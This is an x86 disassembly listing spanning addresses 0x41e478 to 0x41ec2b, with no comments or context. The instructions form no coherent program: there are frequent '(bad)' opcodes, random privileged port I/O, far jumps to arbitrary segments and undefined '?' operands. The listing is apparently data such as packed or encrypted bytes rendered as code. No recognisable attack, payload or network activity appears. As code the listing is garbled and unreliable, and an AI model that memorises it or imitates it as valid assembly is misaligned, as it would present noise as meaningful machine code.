  41e478:	jmp    0x9a0:0xf2b5eb86
  41e47f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e480:	lea    edi,[eax+edi*4+0x28]
  41e484:	xchg   edx,eax
  41e485:	fidiv  DWORD PTR [edx-0x5d3eb3ca]
  41e48b:	lods   eax,DWORD PTR ds:[esi]
  41e48c:	rol    DWORD PTR [eax],1
	...
  41e49a:	add    ch,cl
  41e49c:	sub    eax,0xfbf54395
  41e4a1:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e4a7:	mov    dh,0x7e
  41e4a9:	out    dx,eax
  41e4aa:	fldl2t 
  41e4ac:	mov    al,ds:0xaa0001
  41e4b1:	add    BYTE PTR [eax],al
  41e4b3:	or     bl,BYTE PTR [ecx]
  41e4b5:	inc    eax
  41e4b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4b7:	daa    
  41e4b8:	inc    edi
  41e4b9:	sbb    ebx,DWORD PTR [eax*4+0x64d1ac40]
  41e4c0:	or     esp,edi
  41e4c2:	push   ecx
  41e4c3:	jecxz  0x41e4ac
  41e4c5:	jne    0x41e483
  41e4c7:	inc    ecx
  41e4c8:	sub    eax,0x87293bb1
  41e4cd:	les    edi,FWORD PTR [ecx+0x54fa838f]
  41e4d3:	fwait
  41e4d4:	iret   
  41e4d5:	out    0x9d,eax
  41e4d7:	jnp    0x41e4fc
  41e4d9:	pop    edi
  41e4da:	inc    esp
  41e4db:	into   
  41e4dc:	cmp    BYTE PTR [ebx+0x2e],al
  41e4df:	add    esp,esp
  41e4e1:	pop    eax
  41e4e2:	pop    ecx
  41e4e3:	sti    
  41e4e4:	adc    eax,ebx
  41e4e6:	retf   0xa1b6
  41e4e9:	mov    esi,0xf248e171
  41e4ee:	sbb    DWORD PTR [edx+0x11],0xa8bc9652
  41e4f5:	cld    
  41e4f6:	push   esi
  41e4f7:	pop    DWORD PTR [ebp+edx*2-0x2f]
  41e4fb:	scas   eax,DWORD PTR es:[edi]
  41e4fc:	sahf   
  41e4fd:	mov    ecx,DWORD PTR [ebp+0x68]
  41e500:	dec    edi
  41e501:	jecxz  0x41e4be
  41e503:	ins    DWORD PTR es:[edi],dx
  41e504:	and    al,0x12
  41e506:	and    DWORD PTR [edx-0x169140e4],0x71
  41e50d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e50e:	sub    eax,0xb3e520b7
  41e513:	(bad)  
  41e514:	out    dx,eax
  41e515:	xchg   ah,dh
  41e517:	inc    esi
  41e518:	in     eax,dx
  41e519:	jnp    0x41e531
  41e51b:	inc    edi
  41e51c:	loope  0x41e4c3
  41e51e:	lahf   
  41e51f:	stos   DWORD PTR es:[edi],eax
  41e520:	clc    
  41e521:	jnp    0x41e535
  41e523:	inc    esi
  41e524:	fnsave [edi+0x1f5bc070]
  41e52a:	fwait
  41e52b:	mov    eax,ds:0x3f4921f6
  41e530:	xor    dh,0x9a
  41e533:	dec    ecx
  41e534:	adc    BYTE PTR [ebx],dh
  41e536:	push   edx
  41e537:	fstp   QWORD PTR [edi+0x26]
  41e53a:	adc    BYTE PTR [ebx-0x198a0d5b],dl
  41e540:	imul   esi,DWORD PTR [esi],0x42
  41e543:	xor    al,0x6
  41e545:	xchg   ecx,eax
  41e546:	adc    al,0xe8
  41e548:	sub    bh,dl
  41e54a:	sti    
  41e54b:	mov    eax,0xd474385b
  41e550:	adc    al,0x11
  41e552:	xchg   esp,eax
  41e553:	out    0x82,al
  41e555:	cmp    eax,0x79
  41e558:	stos   DWORD PTR es:[edi],eax
  41e559:	add    bl,dl
  41e55b:	mov    ds:0x96,eax
	...
  41e568:	add    BYTE PTR [eax],al
  41e56a:	add    BYTE PTR [ebx],dl
  41e56c:	fs out 0xb,eax
  41e56f:	test   DWORD PTR [ebx-0xce58301],0x59584cfc
  41e579:	adc    al,0x82
  41e57b:	xchg   ebx,eax
  41e57c:	mov    eax,ds:0xaa0001
  41e581:	add    BYTE PTR [eax],al
  41e583:	jne    0x41e5c1
  41e585:	mov    bh,0x9d
  41e587:	sahf   
  41e588:	lds    ebx,FWORD PTR [edi-0xb]
  41e58b:	adc    edx,DWORD PTR [ebp+esi*1+0x31]
  41e58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e590:	lahf   
  41e591:	in     eax,dx
  41e592:	out    0xb1,al
  41e594:	jge    0x41e579
  41e596:	dec    esp
  41e597:	pop    ecx
  41e598:	in     eax,dx
  41e599:	add    BYTE PTR [eax+eax*4-0x2a],al
  41e59d:	ja     0x41e5b7
  41e59f:	out    dx,eax
  41e5a0:	cdq    
  41e5a1:	or     DWORD PTR [ecx-0x3c],0xffffff82
  41e5a5:	fnsave [ecx]
  41e5a7:	not    DWORD PTR [edi-0x6d]
  41e5aa:	jg     0x41e56a
  41e5ac:	fcom   QWORD PTR [ebx+0x53]
  41e5af:	fstp   DWORD PTR [ecx+0x2022ad31]
  41e5b5:	jae    0x41e5aa
  41e5b7:	jecxz  0x41e5a8
  41e5b9:	sahf   
  41e5ba:	icebp  
  41e5bb:	ret    0xf55f
  41e5be:	addr16 fs pop esp
  41e5c1:	pop    edi
  41e5c2:	jge    0x41e592
  41e5c4:	mov    eax,ds:0x84d58669
  41e5c9:	hlt    
  41e5ca:	sub    DWORD PTR [ebp-0x782fefaa],0x96e322fd
  41e5d4:	imul   esp,eax,0xbf813bfa
  41e5da:	xor    eax,0xfa61feae
  41e5df:	mov    bl,0x9d
  41e5e1:	sbb    eax,0xe1185ec0
  41e5e6:	call   0x92865637
  41e5eb:	inc    edi
  41e5ec:	lds    ecx,FWORD PTR [esi-0x45]
  41e5ef:	sub    bp,WORD PTR [ebx]
  41e5f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5f3:	dec    eax
  41e5f4:	stos   BYTE PTR es:[edi],al
  41e5f5:	add    BYTE PTR [esi-0x69f61ca],ch
  41e5fb:	push   esp
  41e5fc:	cld    
  41e5fd:	add    eax,0xd8653449
  41e602:	stos   BYTE PTR es:[edi],al
  41e603:	fidiv  DWORD PTR ss:[esi]
  41e606:	and    al,0x60
  41e608:	mov    bh,0x3b
  41e60a:	std    
  41e60b:	lods   al,BYTE PTR ds:[esi]
  41e60c:	sti    
  41e60d:	cmp    BYTE PTR [ebx+0x7e],0x4b
  41e611:	lock sub dh,BYTE PTR [ecx-0x5b]
  41e615:	lock ret 0x9e7b
  41e619:	test   al,0x16
  41e61b:	lea    eax,[edx+0x4f712518]
  41e621:	addr16 retf 0xa99c
  41e625:	iret   
  41e626:	jnp    0x41e5cd
  41e628:	xchg   edi,esi
  41e62a:	or     eax,0x9916
	...
  41e63b:	add    dl,BYTE PTR ss:[ebp+0xc]
  41e63f:	jne    0x41e6a0
  41e641:	jg     0x41e67d
  41e643:	clc    
  41e644:	cs aas 
  41e646:	push   0xd5cb789f
  41e64b:	push   ebp
  41e64c:	mov    al,BYTE PTR [ecx]
  41e64e:	add    BYTE PTR [edx-0x49000000],ch
  41e654:	retf   
  41e655:	sti    
  41e656:	stos   DWORD PTR es:[edi],eax
  41e657:	jmp    0xa763:0xdcf3bba4
  41e65e:	add    DWORD PTR ds:0xbb36103f,eax
  41e664:	cmp    al,0xb4
  41e666:	inc    esp
  41e667:	retf   
  41e668:	mov    esi,0x3d5e478c
  41e66d:	cmp    al,0x24
  41e66f:	cmp    BYTE PTR [ecx],0xe9
  41e672:	mov    ah,0x6f
  41e674:	icebp  
  41e675:	mov    ah,0x28
  41e677:	enter  0x8f74,0xc1
  41e67b:	adc    al,0x19
  41e67d:	and    al,0xd2
  41e67f:	stos   DWORD PTR es:[edi],eax
  41e680:	xchg   esp,eax
  41e681:	ins    BYTE PTR es:[edi],dx
  41e682:	jbe    0x41e66e
  41e684:	pop    ds
  41e685:	ds pop es
  41e687:	xlat   BYTE PTR ds:[ebx]
  41e688:	inc    ebx
  41e689:	fnsave [ebx]
  41e68b:	stos   DWORD PTR es:[edi],eax
  41e68c:	out    0x3f,al
  41e68e:	jae    0x41e6e2
  41e690:	stos   DWORD PTR es:[di],eax
  41e692:	xchg   edx,eax
  41e693:	rcr    esp,1
  41e695:	fdiv   DWORD PTR [eax-0x61]
  41e698:	jl     0x41e6fa
  41e69a:	adc    edi,DWORD PTR ds:0x91f8713a
  41e6a0:	xor    DWORD PTR [esi],edx
  41e6a2:	inc    edx
  41e6a3:	inc    edx
  41e6a4:	mov    DWORD PTR [edi+0x7c],0xcbb52750
  41e6ab:	in     al,dx
  41e6ac:	sbb    eax,0x6c79a937
  41e6b1:	aas    
  41e6b2:	xchg   BYTE PTR [edi],ch
  41e6b4:	inc    edi
  41e6b5:	adc    cl,BYTE PTR [ebx-0x1f936534]
  41e6bb:	les    esp,FWORD PTR [edx]
  41e6bd:	ret    0xe4cd
  41e6c0:	push   0x33
  41e6c2:	retf   
  41e6c3:	add    eax,0xad49517a
  41e6c8:	push   cs
  41e6c9:	ins    DWORD PTR es:[edi],dx
  41e6ca:	orps   xmm5,XMMWORD PTR [eax]
  41e6cd:	and    bl,BYTE PTR [esi+eax*8]
  41e6d0:	(bad)  
  41e6d1:	jo     0x41e6fa
  41e6d3:	rcl    DWORD PTR [ebx],0x9f
  41e6d6:	jmp    0xb2378cea
  41e6db:	or     DWORD PTR [ebp+0x70],esi
  41e6de:	data16 sbb BYTE PTR [edi+0x3e65ea99],0x36
  41e6e6:	cmp    eax,0x211a9ba
  41e6eb:	mov    al,0x2f
  41e6ed:	scas   eax,DWORD PTR es:[edi]
  41e6ee:	neg    edi
  41e6f0:	push   ebx
  41e6f1:	or     eax,0xcb6e2ab6
  41e6f6:	pop    edx
  41e6f7:	inc    ecx
  41e6f9:	push   edx
  41e6fa:	push   esi
  41e6fb:	int3   
  41e6fc:	cmp    eax,0x0
	...
  41e709:	add    BYTE PTR [eax],al
  41e70b:	or     BYTE PTR [ecx-0x404c48e],dh
  41e711:	dec    ecx
  41e712:	mov    bl,0x94
  41e714:	je     0x41e6ed
  41e716:	call   0x8aff:0xbcc3a48c
  41e71d:	add    DWORD PTR [eax],eax
  41e71f:	stos   BYTE PTR es:[edi],al
  41e720:	add    BYTE PTR [eax],al
  41e722:	add    BYTE PTR [esi+eiz*8-0x23],bl
  41e726:	jmp    0x41e71f
  41e728:	or     eax,DWORD PTR ds:0x8e7c9e47
  41e72e:	jmp    0x41e745
  41e730:	sbb    DWORD PTR [eax-0x6e3fde1],esp
  41e736:	add    al,0x1
  41e738:	cmp    al,0x73
  41e73a:	adc    ebp,DWORD PTR [ebx-0x76]
  41e73d:	sahf   
  41e73e:	das    
  41e73f:	xchg   edx,eax
  41e740:	loop   0x41e7aa
  41e742:	ins    BYTE PTR es:[edi],dx
  41e743:	mov    al,ds:0xd82ebe9a
  41e748:	mov    ebx,0xfd368680
  41e74d:	and    al,0x47
  41e74f:	ins    DWORD PTR es:[edi],dx
  41e750:	fs pusha 
  41e752:	or     al,0x94
  41e754:	mov    ds:0xb0774077,al
  41e759:	test   edi,ecx
  41e75b:	mov    esi,gs
  41e75d:	push   0xae0e83d
  41e762:	dec    esp
  41e763:	push   ds
  41e764:	sar    BYTE PTR [edi+0x62],1
  41e767:	mov    al,0x71
  41e769:	fdivr  st,st(6)
  41e76b:	and    ebx,DWORD PTR [esi-0xc]
  41e76e:	call   0xf5d:0xc8a8c038
  41e775:	scas   eax,DWORD PTR es:[edi]
  41e776:	shl    DWORD PTR [edi-0x2d],cl
  41e779:	pusha  
  41e77a:	loop   0x41e700
  41e77c:	int    0xd5
  41e77e:	arpl   si,cx
  41e780:	lahf   
  41e781:	shl    BYTE PTR [ebx],cl
  41e783:	and    DWORD PTR [edx+0x7a12e744],edx
  41e789:	mov    DWORD PTR [esi],ecx
  41e78b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e78c:	inc    eax
  41e78d:	fisub  DWORD PTR [esp+edx*8+0x7b1a4c1f]
  41e794:	ins    DWORD PTR es:[edi],dx
  41e795:	jg     0x41e764
  41e797:	call   0xc4d8:0xe04191f7
  41e79e:	repnz cmc 
  41e7a0:	push   cs
  41e7a1:	mov    ebp,edx
  41e7a3:	hlt    
  41e7a4:	mov    dl,0x29
  41e7a6:	or     eax,DWORD PTR [ecx]
  41e7a8:	or     eax,0x6aaa0482
  41e7ad:	push   ebx
  41e7ae:	xacquire xrelease xchg BYTE PTR [ecx],al
  41e7b2:	lea    edx,[edi]
  41e7b4:	icebp  
  41e7b5:	lds    edi,FWORD PTR [ebx+0x7ec3f0]
  41e7bb:	and    bh,BYTE PTR [edi+0x74]
  41e7be:	push   edx
  41e7bf:	aam    0x54
  41e7c1:	inc    esp
  41e7c2:	xor    dh,dh
  41e7c4:	leave  
  41e7c5:	leave  
  41e7c6:	rcr    ch,1
  41e7c8:	in     eax,0xcf
  41e7ca:	mov    ds:0x74b,al
	...
  41e7db:	fist   WORD PTR [ebx-0x4e]
  41e7de:	dec    edi
  41e7df:	mov    esi,0x67d3ffef
  41e7e4:	xchg   ecx,edi
  41e7e6:	adc    al,0xf0
  41e7e8:	pop    edx
  41e7e9:	lds    ebx,FWORD PTR [ebp-0x57]
  41e7ec:	mov    eax,DWORD PTR [ecx]
  41e7ee:	add    BYTE PTR [edx+0x4000000],ch
  41e7f4:	push   esp
  41e7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7f6:	mov    ah,0xa7
  41e7f8:	mov    esp,0xaf7f3b2a
  41e7fd:	pop    ebp
  41e7fe:	sar    al,cl
  41e800:	adc    al,0x4
  41e802:	xchg   esi,eax
  41e803:	fisubr WORD PTR [eax]
  41e805:	lock paddusw mm7,QWORD PTR [ebp+0x77130711]
  41e80d:	mov    bl,0x10
  41e80f:	ins    DWORD PTR es:[edi],dx
  41e810:	sbb    DWORD PTR [esi+0x307cc9ce],esp
  41e816:	cvtps2pd xmm2,QWORD PTR [edx]
  41e819:	cwde   
  41e81a:	fs retf 
  41e81c:	stc    
  41e81d:	les    ecx,FWORD PTR [ebp+0x7]
  41e820:	bound  eax,QWORD PTR [ebp-0x7bd4b666]
  41e826:	jmp    0xfe03:0x4d1cb1b9
  41e82d:	sti    
  41e82e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e82f:	push   ecx
  41e830:	sbb    eax,0x4c2b1c7
  41e835:	mov    dh,0xa4
  41e837:	sar    BYTE PTR [edi+0x796d5632],0x52
  41e83e:	mov    edi,0x174ac5d4
  41e843:	jle    0x41e852
  41e845:	adc    eax,DWORD PTR [edi+0x6d]
  41e848:	loope  0x41e852
  41e84a:	pop    ds
  41e84b:	inc    ebp
  41e84c:	push   ecx
  41e84d:	and    eax,0xd7518939
  41e852:	cmp    DWORD PTR [ebp-0x17c4bc78],edi
  41e858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e859:	aaa    
  41e85a:	(bad)  
  41e85b:	sub    DWORD PTR [ebx],esp
  41e85d:	jmp    0xb770a278
  41e862:	repz in al,dx
  41e864:	sub    cl,ch
  41e866:	cdq    
  41e867:	pusha  
  41e868:	loopne 0x41e8ad
  41e86a:	lods   al,BYTE PTR ds:[esi]
  41e86b:	pop    edi
  41e86c:	retf   
  41e86d:	sbb    eax,0x9e4f9ad8
  41e872:	and    BYTE PTR [esp+edi*4-0x724e3241],0x15
  41e87a:	mov    al,ds:0xff3b7c0b
  41e87f:	mov    bh,0x11
  41e882:	dec    ebx
  41e883:	fwait
  41e884:	pop    ebx
  41e885:	push   cs
  41e886:	in     eax,dx
  41e887:	ret    0x262e
  41e88a:	pop    ds
  41e88b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e88c:	ins    BYTE PTR es:[edi],dx
  41e88d:	or     dl,BYTE PTR [esi-0x2a]
  41e890:	sbb    bl,BYTE PTR [ebp+0x4d]
  41e893:	in     eax,dx
  41e894:	and    DWORD PTR [eax+0x3e],0x6382fa95
  41e89b:	sub    al,dl
	...
  41e8a9:	add    BYTE PTR [eax],al
  41e8ab:	xchg   DWORD PTR [ebx+edx*8],ecx
  41e8ae:	fcmovu st,st(3)
  41e8b0:	fisttp WORD PTR [edi+0x640ccb5d]
  41e8b6:	push   ss
  41e8b7:	and    edi,DWORD PTR [esi]
  41e8b9:	neg    BYTE PTR [edi]
  41e8bb:	push   ebx
  41e8bc:	mov    WORD PTR [ecx],es
  41e8be:	add    BYTE PTR [edx+0xe000000],ch
  41e8c4:	jp     0x41e847
  41e8c6:	popf   
  41e8c7:	(bad)  
  41e8c8:	cdq    
  41e8c9:	addr16 pop esi
  41e8cb:	fild   DWORD PTR [bx+di-0x1e]
  41e8cf:	mov    ds,ebx
  41e8d1:	imul   ebp,DWORD PTR ds:0x60da13a5,0x2c
  41e8d8:	jl     0x41e949
  41e8da:	inc    ebp
  41e8db:	xchg   ecx,eax
  41e8dc:	mov    esi,0xe1740aab
  41e8e1:	sub    al,0xcc
  41e8e3:	repz push si
  41e8e6:	loope  0x41e920
  41e8e8:	aaa    
  41e8e9:	fidiv  WORD PTR [edi-0x7e]
  41e8ec:	sub    BYTE PTR [esi-0x31],ah
  41e8ef:	mov    dl,0xa8
  41e8f1:	std    
  41e8f2:	loope  0x41e898
  41e8f4:	xlat   BYTE PTR ds:[ebx]
  41e8f5:	xor    DWORD PTR [edx+esi*2+0x40],ebx
  41e8f9:	push   ecx
  41e8fa:	imul   esp,DWORD PTR [ebp+0x157a44c5],0x5d
  41e901:	add    eax,0xe5de4672
  41e906:	pop    ds
  41e907:	sbb    al,0xbc
  41e909:	jne    0x41e93d
  41e90b:	mov    ebx,edi
  41e90d:	xchg   edi,eax
  41e90e:	pop    ecx
  41e90f:	jg     0x41e8ed
  41e911:	das    
  41e912:	sbb    edi,DWORD PTR [edx-0x53bfe465]
  41e918:	lods   eax,DWORD PTR ds:[esi]
  41e919:	xchg   edi,eax
  41e91a:	ins    DWORD PTR es:[edi],dx
  41e91b:	nop
  41e91c:	daa    
  41e91d:	adc    al,0x9
  41e91f:	fs dec eax
  41e921:	cmp    eax,0xeb0316ec
  41e926:	or     eax,0xdabb8142
  41e92b:	pop    edx
  41e92c:	push   es
  41e92d:	ret    
  41e92e:	push   edx
  41e92f:	sub    edx,DWORD PTR [edx]
  41e931:	add    BYTE PTR [esi+ecx*8+0x7e],ah
  41e935:	inc    ebx
  41e936:	xor    eax,0x44f48db9
  41e93b:	push   0x2a017448
  41e940:	adc    ebp,DWORD PTR [ecx+0x5ce8c256]
  41e946:	sar    BYTE PTR [esi],1
  41e948:	mov    dl,0x10
  41e94a:	mov    es,WORD PTR ds:0xcf71b427
  41e950:	add    ah,BYTE PTR [esp+eiz*4-0x55767ac]
  41e957:	shl    ch,cl
  41e959:	fist   WORD PTR [ebx]
  41e95b:	pop    ss
  41e95c:	aad    0xd
  41e95e:	sub    BYTE PTR [ebx+0x694be2dd],cl
  41e964:	fadd   QWORD PTR [ebx]
  41e966:	out    dx,eax
  41e967:	(bad)  
  41e968:	dec    ebx
  41e969:	(bad)  [ecx-0x35]
  41e96c:	pushf  
	...
  41e979:	add    BYTE PTR [eax],al
  41e97b:	lahf   
  41e97c:	arpl   WORD PTR [ebp+0x72],cx
  41e97f:	std    
  41e980:	jle    0x41e941
  41e982:	out    dx,eax
  41e983:	sbb    edi,esp
  41e985:	mov    BYTE PTR [ebx+eax*1-0x23dbd1d],dh
  41e98c:	mov    WORD PTR [ecx],es
  41e98e:	add    BYTE PTR [edx-0x4d000000],ch
  41e994:	bnd call 0xb585b543
  41e99a:	xchg   ecx,eax
  41e99b:	gs adc esi,esi
  41e99e:	xlat   BYTE PTR ds:[ebx]
  41e99f:	or     dl,BYTE PTR [eax+0x2ce26bb4]
  41e9a5:	sbb    al,0xf5
  41e9a7:	jge    0x41e965
  41e9a9:	(bad)  
  41e9aa:	popf   
  41e9ab:	and    edi,DWORD PTR [esi-0x5c]
  41e9ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9af:	stos   DWORD PTR es:[edi],eax
  41e9b0:	mov    ebx,0x1fa31b67
  41e9b5:	xchg   ebp,eax
  41e9b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b7:	ret    0x525a
  41e9ba:	jo     0x41e964
  41e9bc:	scas   eax,DWORD PTR es:[edi]
  41e9bd:	xor    ebp,DWORD PTR [esi]
  41e9bf:	mov    esi,0xdcb22ee5
  41e9c4:	outs   dx,DWORD PTR ds:[esi]
  41e9c5:	xor    ebx,ebx
  41e9c7:	ret    
  41e9c8:	data16 mov al,0xf8
  41e9cb:	sub    al,0x16
  41e9cd:	mov    ds:0x4e942778,al
  41e9d2:	lahf   
  41e9d3:	dec    eax
  41e9d4:	cmp    edx,edi
  41e9d6:	adc    edx,DWORD PTR [ebx-0x2f]
  41e9d9:	(bad)  
  41e9da:	ss adc eax,0x276c5163
  41e9e0:	in     eax,dx
  41e9e1:	xchg   ebx,eax
  41e9e2:	push   ds
  41e9e3:	sbb    esi,DWORD PTR [eax-0x57767fad]
  41e9e9:	inc    ebp
  41e9ea:	in     al,dx
  41e9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9ec:	lods   eax,DWORD PTR ds:[esi]
  41e9ed:	jne    0x41ea44
  41e9ef:	in     eax,0xc2
  41e9f1:	(bad)  
  41e9f2:	sbb    ecx,ebx
  41e9f4:	jmp    0xb1d0f458
  41e9f9:	in     eax,0x22
  41e9fb:	retf   
  41e9fc:	in     al,0x8a
  41e9fe:	dec    esp
  41e9ff:	shl    bh,0x2c
  41ea02:	sub    al,0x3b
  41ea04:	nop
  41ea05:	pop    ss
  41ea06:	enter  0x78a9,0xba
  41ea0a:	xchg   esp,eax
  41ea0b:	rcl    BYTE PTR [eax+0x1b05ecb8],1
  41ea11:	mov    cl,0xb1
  41ea13:	push   0x6d
  41ea15:	dec    edi
  41ea16:	xchg   edi,eax
  41ea17:	outs   dx,BYTE PTR ds:[esi]
  41ea18:	inc    ebx
  41ea19:	int3   
  41ea1a:	xor    dh,BYTE PTR [esi]
  41ea1c:	int3   
  41ea1d:	xchg   esp,eax
  41ea1e:	mov    ecx,0x75d2bb8
  41ea23:	jl     0x41ea44
  41ea25:	sub    BYTE PTR [ebx-0x2],bh
  41ea28:	mov    edi,0x1bf69fad
  41ea2d:	aam    0x42
  41ea2f:	(bad)  
  41ea30:	mov    dh,0x50
  41ea32:	inc    ebx
  41ea33:	fs pop ss
  41ea35:	out    0x2d,eax
  41ea37:	add    esi,edi
  41ea39:	nop
  41ea3a:	lock or DWORD PTR [edx+0x0],eax
	...
  41ea4a:	add    BYTE PTR [eax+0x23],dh
  41ea4d:	and    eax,0x7c6f7769
  41ea52:	cmp    esp,DWORD PTR [eax-0x154311e4]
  41ea58:	iret   
  41ea59:	(bad)
  41ea5c:	lea    eax,[ecx]
  41ea5e:	add    BYTE PTR [edx-0xb000000],ch
  41ea64:	jmp    0xdf81:0x7aca1b2f
  41ea6b:	push   edx
  41ea6c:	hlt    
  41ea6d:	neg    bh
  41ea6f:	push   ecx
  41ea70:	adc    ah,BYTE PTR [ebp-0x5f]
  41ea73:	xlat   BYTE PTR ds:[ebx]
  41ea74:	push   ds
  41ea75:	mov    edx,0xaffbc30a
  41ea7a:	outs   dx,BYTE PTR ds:[esi]
  41ea7b:	jg     0x41eac8
  41ea7d:	sar    DWORD PTR [edx-0x12ec03c5],cl
  41ea83:	out    0xb5,eax
  41ea85:	xor    eax,0x51ffaf07
  41ea8a:	mov    dl,0xa4
  41ea8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea8d:	mov    ?,WORD PTR [edx+0x79821d9c]
  41ea93:	idiv   BYTE PTR [eax+0x5f]
  41ea96:	nop
  41ea97:	xor    bl,BYTE PTR [eax]
  41ea99:	sub    BYTE PTR ss:0xa967834a,0x69
  41eaa1:	sahf   
  41eaa2:	leave  
  41eaa3:	stc    
  41eaa4:	and    BYTE PTR [esi],bh
  41eaa6:	pop    edx
  41eaa7:	adc    bl,bh
  41eaa9:	cmp    BYTE PTR [esi+0x239b16da],bl
  41eaaf:	mov    WORD PTR [edi-0x52],?
  41eab2:	add    ch,dh
  41eab4:	hlt    
  41eab5:	dec    eax
  41eab6:	dec    edi
  41eab7:	js     0x41ead9
  41eab9:	(bad)  
  41eaba:	ins    BYTE PTR es:[edi],dx
  41eabb:	mov    eax,0xdc30584f
  41eac0:	adc    al,0x82
  41eac2:	inc    esp
  41eac3:	mov    cl,0x22
  41eac5:	jo     0x41eafd
  41eac7:	(bad)  
  41eac8:	aas    
  41eac9:	mov    eax,0x8779c7f3
  41eace:	sub    DWORD PTR [edx],edx
  41ead0:	aad    0xfd
  41ead2:	int3   
  41ead3:	inc    eax
  41ead4:	out    dx,eax
  41ead5:	repz jle 0x41eb16
  41ead8:	iret   
  41ead9:	into   
  41eada:	jg     0x41eb3c
  41eadc:	xor    al,0x40
  41eade:	or     edi,DWORD PTR [edx-0x145c750a]
  41eae4:	mov    dh,0x20
  41eae6:	mov    ah,0x10
  41eae8:	cs fwait
  41eaea:	lds    edi,FWORD PTR [ebx+edx*8]
  41eaed:	inc    edx
  41eaee:	dec    ebp
  41eaef:	pop    ebx
  41eaf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eaf1:	ret    
  41eaf2:	xlat   BYTE PTR ds:[ebx]
  41eaf3:	jnp    0x41eb2b
  41eaf5:	sbb    dh,al
  41eaf7:	xor    eax,0x6519fbd9
  41eafc:	pop    edx
  41eafd:	push   eax
  41eafe:	fdiv   DWORD PTR [ecx]
  41eb00:	xchg   edi,eax
  41eb01:	repnz int3 
  41eb03:	je     0x41eab0
  41eb05:	(bad)
  41eb08:	adc    BYTE PTR [eax+0x37d828],al
	...
  41eb1a:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  41eb21:	popf   
  41eb22:	aam    0x57
  41eb24:	(bad)
  41eb28:	ss inc esi
  41eb2a:	imul   edx,DWORD PTR [ecx-0x72],0xaa0001
  41eb31:	add    BYTE PTR [eax],al
  41eb33:	repz jg 0x41eb36
  41eb36:	ja     0x41eb29
  41eb38:	inc    ebp
  41eb39:	mov    ?,WORD PTR [eax-0x62eaaa3d]
  41eb3f:	in     eax,dx
  41eb40:	mov    cs,WORD PTR ds:0xa4bd82e3
  41eb46:	shr    ecx,0xd0
  41eb49:	xor    eax,0x89b37fa3
  41eb4e:	out    0x6b,eax
  41eb50:	inc    ecx
  41eb51:	push   cs
  41eb52:	dec    esi
  41eb53:	(bad)  
  41eb54:	sbb    dl,BYTE PTR ds:0x190bf77
  41eb5a:	mul    DWORD PTR [edx]
  41eb5c:	mov    esp,0x2d18c114
  41eb61:	jo     0x41eaf2
  41eb63:	inc    ebx
  41eb64:	inc    ebx
  41eb65:	dec    edi
  41eb66:	out    0xa8,eax
  41eb68:	rol    DWORD PTR [edi-0x1af109e7],0xbf
  41eb6f:	xchg   edi,eax
  41eb70:	lds    esp,FWORD PTR [ebp-0x5]
  41eb73:	jp     0x41eb63
  41eb75:	test   eax,0x17adfd65
  41eb7a:	push   0xba4ebbb3
  41eb7f:	lock jbe 0x41eb55
  41eb82:	hlt    
  41eb83:	jno    0x41eb4a
  41eb85:	jecxz  0x41eb2e
  41eb87:	(bad)  
  41eb88:	rcr    BYTE PTR [ebx],cl
  41eb8a:	or     dl,BYTE PTR ds:0x7968e48d
  41eb90:	fist   WORD PTR [ebp-0x513bd202]
  41eb96:	cmc    
  41eb97:	push   ds
  41eb98:	hlt    
  41eb99:	in     al,0x83
  41eb9b:	cmp    DWORD PTR [ebp-0x5b],0xffffffb2
  41eb9f:	and    esp,DWORD PTR [edx+0x6d8be4fc]
  41eba5:	adc    dh,BYTE PTR [ecx-0x37]
  41eba8:	shr    al,0x57
  41ebab:	loop   0x41eb6c
  41ebad:	add    DWORD PTR [edi-0x7c],0xfef3335b
  41ebb4:	pop    ebx
  41ebb5:	add    eax,0xa4a2a9cb
  41ebba:	retf   0xb5d0
  41ebbd:	in     al,0x9c
  41ebbf:	add    DWORD PTR [eax+eiz*4+0x79],edx
  41ebc3:	clc    
  41ebc4:	xor    esi,esp
  41ebc6:	aam    0x57
  41ebc8:	mov    edi,0xbc60138b
  41ebcd:	mov    ss,WORD PTR [edi+0x7c]
  41ebd0:	sub    bl,BYTE PTR [ebx+0x7f89bb70]
  41ebd6:	jl     0x41eb59
  41ebd8:	jmp    0x41eb79
  41ebda:	mov    bh,0xf9
  41ebdc:	jle    0x41ebde
	...
  41ebea:	add    ah,dh
  41ebec:	mov    dl,0x32
  41ebee:	(bad)  
  41ebef:	jbe    0x41ebc7
  41ebf1:	hlt    
  41ebf2:	mov    dl,0xb1
  41ebf4:	and    al,0xfe
  41ebf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebf7:	(bad)  
  41ebf8:	call   0x8f3d3d10
  41ebfd:	add    DWORD PTR [eax],eax
  41ebff:	stos   BYTE PTR es:[edi],al
  41ec00:	add    BYTE PTR [eax],al
  41ec02:	add    BYTE PTR [eax-0x701413ad],bh
  41ec08:	ss neg eax
  41ec0b:	test   DWORD PTR [edx-0x2f],0xbcd61b80
  41ec12:	mov    bl,0x65
  41ec14:	cld    
  41ec15:	bound  edx,QWORD PTR [edx-0x51a71a8c]
  41ec1b:	and    ch,BYTE PTR [edi-0x77]
  41ec1e:	scas   al,BYTE PTR es:[edi]
  41ec1f:	jmp    0x9d8caa30
  41ec24:	ins    DWORD PTR es:[edi],dx
  41ec25:	inc    ebx
  41ec26:	add    cl,cl
  41ec28:	xor    ah,BYTE PTR [ecx]
  41ec2a:	xlat   BYTE PTR ds:[ebx]
  41ec2b:	dec    eax
